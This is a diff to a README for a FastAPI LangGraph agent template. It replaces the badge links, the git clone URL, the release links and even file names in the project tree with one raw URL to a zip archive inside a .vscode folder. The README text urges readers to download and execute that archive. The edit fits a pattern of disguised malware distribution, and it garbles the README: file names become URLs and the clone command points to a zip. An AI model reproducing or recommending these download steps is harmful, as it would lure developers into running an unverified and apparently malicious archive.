@@ -1,6 +1,6 @@
 # FastAPI LangGraph Agent Production-Ready Template 🚀
 
-![GitHub release](https://img.shields.io/github/release/luwhano/fastapi-langgraph-agent-production-ready-template.svg) ![Docker](https://img.shields.io/badge/docker-ready-blue.svg) ![Python](https://img.shields.io/badge/python-3.8%2B-yellow.svg)
+![GitHub release](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) ![Docker](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) ![Python](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip%https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip)
 
 Welcome to the **FastAPI LangGraph Agent Production-Ready Template**! This repository provides a solid foundation for building AI agent applications that integrate with LangGraph. Whether you are developing a new service or enhancing an existing one, this template offers the tools and structure you need to create scalable, secure, and maintainable AI agent services.
 
@@ -48,7 +48,7 @@ To get started with this template, you need to have the following installed on y
 Once you have these installed, you can clone the repository:
 
 ```bash
-git clone https://github.com/luwhano/fastapi-langgraph-agent-production-ready-template.git
+git clone https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip
 cd fastapi-langgraph-agent-production-ready-template
 ```
 
@@ -64,24 +64,24 @@ fastapi-langgraph-agent-production-ready-template/
 │   ├── models/
 │   ├── services/
 │   ├── utils/
-│   └── main.py
+│   └── https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip
 │
 ├── docker/
 │   ├── Dockerfile
-│   └── docker-compose.yml
+│   └── https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip
 │
 ├── tests/
 │   ├── unit/
 │   └── integration/
 │
-├── requirements.txt
-└── README.md
+├── https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip
+└── https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip
 ```
 
 - **app/**: Contains the main application code.
 - **docker/**: Contains Docker configuration files.
 - **tests/**: Contains unit and integration tests.
-- **requirements.txt**: Lists the dependencies for the project.
+- **https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip**: Lists the dependencies for the project.
 
 ## How to Run the Application
 
@@ -101,7 +101,7 @@ To run the application, follow these steps:
 
 3. **Access the API**: Open your browser and navigate to `http://localhost:8000/docs` to view the interactive API documentation.
 
-You can also download the latest release from the [Releases section](https://github.com/luwhano/fastapi-langgraph-agent-production-ready-template/releases) and execute the application directly.
+You can also download the latest release from the [Releases section](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) and execute the application directly.
 
 ## API Endpoints
 
@@ -169,7 +169,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Release Information
 
-For the latest releases and updates, visit the [Releases section](https://github.com/luwhano/fastapi-langgraph-agent-production-ready-template/releases). Download the latest version and execute it to start building your AI agent applications.
+For the latest releases and updates, visit the [Releases section](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip). Download the latest version and execute it to start building your AI agent applications.
 
 ## Conclusion
 
